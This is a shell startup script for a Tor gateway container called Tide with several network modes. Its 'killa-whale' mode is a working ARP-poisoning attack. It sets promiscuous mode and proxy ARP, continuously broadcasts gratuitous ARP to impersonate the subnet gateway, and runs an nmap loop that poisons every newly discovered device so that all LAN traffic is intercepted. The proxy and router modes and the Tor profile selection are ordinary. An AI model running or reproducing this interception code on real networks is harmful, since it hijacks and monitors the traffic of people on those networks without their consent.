#!/bin/sh
# Tide Gateway Startup - Multi-mode support
# Supports: proxy, router, killa-whale, takeover

set -e

echo "🌊 Starting Tide Gateway"

# Load configuration from environment or defaults
TIDE_MODE="${TIDE_MODE:-router}"
TIDE_SECURITY="${TIDE_SECURITY:-standard}"
TIDE_GATEWAY_IP="${TIDE_GATEWAY_IP:-10.101.101.10}"
TIDE_SUBNET="${TIDE_SUBNET:-10.101.101.0/24}"

echo "📋 Configuration:"
echo "   Mode: $TIDE_MODE"
echo "   Security: $TIDE_SECURITY"
echo "   Gateway IP: $TIDE_GATEWAY_IP"

# Save mode and security to /etc/tide for API
mkdir -p /etc/tide
echo "$TIDE_MODE" > /etc/tide/mode
echo "$TIDE_SECURITY" > /etc/tide/security

# Enable IP forwarding if needed
if [ "$TIDE_MODE" != "proxy" ]; then
    echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || echo "⚠️  IP forwarding already enabled"
fi

# Disable IPv6 completely
echo "🚫 Disabling IPv6..."
sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1 || true
sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null 2>&1 || true

# Wait for network
sleep 2

# ============================================
# MODE: PROXY
# ============================================
if [ "$TIDE_MODE" = "proxy" ]; then
    echo "🔧 Mode: Proxy (SOCKS5 only)"
    echo "   No DHCP, no transparent routing"
    echo "   Clients must manually configure SOCKS5: $TIDE_GATEWAY_IP:9050"
    
    # No firewall rules needed for proxy mode
    
# ============================================
# MODE: ROUTER
# ============================================
elif [ "$TIDE_MODE" = "router" ]; then
    echo "🔧 Mode: Router (Transparent + DHCP)"
    
    # NAT rules for transparent proxy
    iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 9051 -j ACCEPT
    iptables -t nat -A PREROUTING -i eth0 -p tcp -j REDIRECT --to-ports 9040
    iptables -t nat -A PREROUTING -i eth0 -p udp --dport 53 -j REDIRECT --to-ports 5353
    iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 53 -j REDIRECT --to-ports 5353
    iptables -t nat -A OUTPUT -m owner --uid-owner tor -j RETURN
    
    echo "✅ Transparent routing enabled"
    
    # Configure DHCP
    cat > /etc/dnsmasq.conf << EOF
interface=eth0
dhcp-range=${TIDE_DHCP_START:-10.101.101.100},${TIDE_DHCP_END:-10.101.101.200},12h
dhcp-option=3,$TIDE_GATEWAY_IP
dhcp-option=6,$TIDE_GATEWAY_IP
server=127.0.0.1#5353
no-resolv
log-queries
log-dhcp
EOF
    
    echo "🌐 Starting dnsmasq (DHCP + DNS)..."
    dnsmasq --no-daemon --log-facility=- &

# ============================================
# MODE: KILLA WHALE (AGGRESSIVE TAKEOVER)
# ============================================
elif [ "$TIDE_MODE" = "killa-whale" ]; then
    echo "🐋 Mode: KILLA WHALE - AGGRESSIVE NETWORK TAKEOVER"
    echo "   ⚠️  MAXIMUM AGGRESSION: All subnet traffic WILL be intercepted"
    echo "   ⚠️  ARP poisoning, IP hijacking, fail-closed enforcement"
    echo "   ⚠️  NOTHING escapes without going through Tor"
    
    # ARP tools should already be installed in Docker image
    echo "📦 Network hijacking tools ready (nmap, arping, iputils)"
    
    # Enable IP forwarding (already done by sysctls in docker-compose)
    echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || echo "   IP forwarding handled by Docker"
    
    # Enable promiscuous mode (sniff all packets)
    echo "🔓 Enabling promiscuous mode..."
    ip link set eth0 promisc on
    
    # Disable ICMP redirects (hide the real gateway)
    echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects
    echo 0 > /proc/sys/net/ipv4/conf/eth0/send_redirects
    echo 0 > /proc/sys/net/ipv4/conf/all/accept_redirects
    echo 0 > /proc/sys/net/ipv4/conf/eth0/accept_redirects
    
    # Enable proxy ARP (respond to ARP for ANY IP)
    echo 1 > /proc/sys/net/ipv4/conf/eth0/proxy_arp
    echo 1 > /proc/sys/net/ipv4/conf/all/proxy_arp
    
    # AGGRESSIVE FIREWALL - FAIL-CLOSED
    echo "🔒 Installing AGGRESSIVE fail-closed firewall..."
    
    # NAT: Intercept EVERYTHING
    iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 9051 -j ACCEPT  # API access
    iptables -t nat -A PREROUTING -i eth0 -p tcp -j REDIRECT --to-ports 9040  # ALL TCP → Tor
    iptables -t nat -A PREROUTING -i eth0 -p udp --dport 53 -j REDIRECT --to-ports 5353  # DNS → Tor
    iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 53 -j REDIRECT --to-ports 5353
    
    # MANGLE: Mark all packets for tracking
    iptables -t mangle -A PREROUTING -i eth0 -j MARK --set-mark 1
    
    # FILTER: MAXIMUM LOCKDOWN
    iptables -P INPUT DROP
    iptables -P FORWARD DROP
    iptables -P OUTPUT DROP
    
    # INPUT: Only allow essential traffic
    iptables -A INPUT -i lo -j ACCEPT
    iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
    iptables -A INPUT -i eth0 -s ${TIDE_SUBNET} -p tcp -m multiport --dports 9040,9050,9051,22,80,443 -j ACCEPT
    iptables -A INPUT -i eth0 -s ${TIDE_SUBNET} -p udp --dport 53 -j ACCEPT
    iptables -A INPUT -i eth0 -s ${TIDE_SUBNET} -p udp --dport 67 -j ACCEPT
    iptables -A INPUT -i eth0 -p icmp -j ACCEPT
    
    # FORWARD: Block everything (we proxy, don't route)
    iptables -A FORWARD -j LOG --log-prefix "TIDE-BLOCKED-FORWARD: "
    iptables -A FORWARD -j DROP
    
    # OUTPUT: ONLY Tor can escape
    iptables -A OUTPUT -o lo -j ACCEPT
    iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
    iptables -A OUTPUT -m owner --uid-owner tor -p tcp -j ACCEPT  # ONLY TOR
    iptables -A OUTPUT -o eth0 -d ${TIDE_SUBNET} -j ACCEPT  # Talk to clients
    iptables -A OUTPUT -p udp --dport 67 -j ACCEPT  # DHCP
    iptables -A OUTPUT -p udp --dport 123 -m owner --uid-owner root -j ACCEPT  # NTP
    # LOG and DROP everything else
    iptables -A OUTPUT -j LOG --log-prefix "TIDE-BLOCKED-OUTPUT: "
    iptables -A OUTPUT -j DROP
    
    echo "✅ AGGRESSIVE firewall installed - NOTHING escapes"
    
    # Configure DHCP with AGGRESSIVE options
    cat > /etc/dnsmasq.conf << EOF
interface=eth0
bind-interfaces
dhcp-range=${TIDE_DHCP_START:-10.101.101.100},${TIDE_DHCP_END:-10.101.101.200},12h
dhcp-option=3,$TIDE_GATEWAY_IP
dhcp-option=6,$TIDE_GATEWAY_IP
dhcp-option=15,tide.local
dhcp-option=42,0.0.0.0
dhcp-authoritative
server=127.0.0.1#5353
no-resolv
no-hosts
expand-hosts
domain=tide.local
log-queries
log-dhcp
EOF
    
    echo "🌐 Starting AGGRESSIVE dnsmasq..."
    dnsmasq --no-daemon --log-facility=- &
    
    # START ARP POISONING ATTACK
    echo "💉 LAUNCHING ARP POISONING ATTACK..."
    
    # Discover network
    NETWORK=$(echo "$TIDE_SUBNET" | cut -d'/' -f1 | cut -d'.' -f1-3)
    
    # Continuous ARP poisoning script
    cat > /usr/local/bin/arp-poison.sh << 'ARPSCRIPT'
#!/bin/sh
# Aggressive ARP poisoning - claim we are EVERYTHING
INTERFACE=eth0
GATEWAY_IP=$1
SUBNET=$2
NETWORK=$(echo "$SUBNET" | cut -d'/' -f1 | cut -d'.' -f1-3)

echo "🔥 ARP POISON: Broadcasting as default gateway..."

# Continuously broadcast gratuitous ARP
while true; do
    # Claim we are the default gateway (.1)
    arping -U -c 1 -I "$INTERFACE" -s "${NETWORK}.1" "${NETWORK}.255" 2>/dev/null
    arping -A -c 1 -I "$INTERFACE" -s "${NETWORK}.1" "${NETWORK}.255" 2>/dev/null
    
    # Also claim we are the gateway IP itself
    arping -U -c 1 -I "$INTERFACE" "$GATEWAY_IP" 2>/dev/null
    
    sleep 2
done
ARPSCRIPT
    
    chmod +x /usr/local/bin/arp-poison.sh
    /usr/local/bin/arp-poison.sh "$TIDE_GATEWAY_IP" "$TIDE_SUBNET" &
    
    # Network scanner - poison new devices immediately
    cat > /usr/local/bin/network-scanner.sh << 'SCANSCRIPT'
#!/bin/sh
SUBNET=$1
GATEWAY_IP=$2
INTERFACE=eth0
SEEN_FILE=/tmp/tide-seen-hosts

touch "$SEEN_FILE"

echo "👁️  SCANNING: Monitoring for new devices to poison..."

while true; do
    # Quick scan
    nmap -sn "$SUBNET" 2>/dev/null | grep "Nmap scan report" | awk '{print $NF}' | tr -d '()' | while read IP; do
        if ! grep -q "$IP" "$SEEN_FILE"; then
            echo "🎯 NEW TARGET: $IP - POISONING NOW"
            echo "$IP" >> "$SEEN_FILE"
            
            # Poison this specific device
            (
                while true; do
                    arping -c 1 -I "$INTERFACE" -s "$GATEWAY_IP" "$IP" >/dev/null 2>&1
                    sleep 3
                done
            ) &
        fi
    done
    
    sleep 10
done
SCANSCRIPT
    
    chmod +x /usr/local/bin/network-scanner.sh
    /usr/local/bin/network-scanner.sh "$TIDE_SUBNET" "$TIDE_GATEWAY_IP" &
    
    echo "✅ ARP POISONING ACTIVE - All devices will be intercepted"

# ============================================
# MODE: TAKEOVER (Killa Whale + ARP Hijack)
# ============================================
elif [ "$TIDE_MODE" = "takeover" ]; then
    echo "🔧 Mode: Takeover (ARP Hijacking)"
    echo "⚠️  WARNING: This mode is NOT YET IMPLEMENTED"
    echo "   Falling back to Killa Whale mode..."
    
    # TODO: Implement ARP hijacking
    # For now, just use killa-whale mode
    TIDE_MODE=killa-whale
    exec "$0"  # Re-run with killa-whale mode

else
    echo "❌ Unknown mode: $TIDE_MODE"
    echo "   Valid modes: proxy, router, killa-whale, takeover"
    exit 1
fi

# ============================================
# SECURITY PROFILES (Torrc Selection)
# ============================================
TORRC="/etc/tor/torrc"

case "$TIDE_SECURITY" in
    standard)
        echo "🔐 Security: Standard (default Tor settings)"
        # Use default torrc-gateway
        ;;
    hardened)
        echo "🔐 Security: Hardened (excluding 14-eyes countries)"
        if [ -f /etc/tor/torrc-hardened ]; then
            TORRC="/etc/tor/torrc-hardened"
        else
            echo "⚠️  torrc-hardened not found, using standard"
        fi
        ;;
    paranoid)
        echo "🔐 Security: Paranoid (maximum isolation)"
        if [ -f /etc/tor/torrc-paranoid ]; then
            TORRC="/etc/tor/torrc-paranoid"
        else
            echo "⚠️  torrc-paranoid not found, using standard"
        fi
        ;;
    bridges)
        echo "🔐 Security: Bridges (obfs4 for censorship bypass)"
        if [ -f /etc/tor/torrc-bridges ]; then
            TORRC="/etc/tor/torrc-bridges"
        else
            echo "⚠️  torrc-bridges not found, using standard"
        fi
        ;;
    *)
        echo "⚠️  Unknown security profile: $TIDE_SECURITY (using standard)"
        ;;
esac

# ============================================
# START SERVICES
# ============================================

# Start API server (all modes)
echo "🌐 Starting Tide API server (port 9051)..."
python3 /usr/local/bin/tide-api.py &

# Start Tor
echo "🔐 Starting Tor with config: $TORRC"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
exec tor -f "$TORRC"
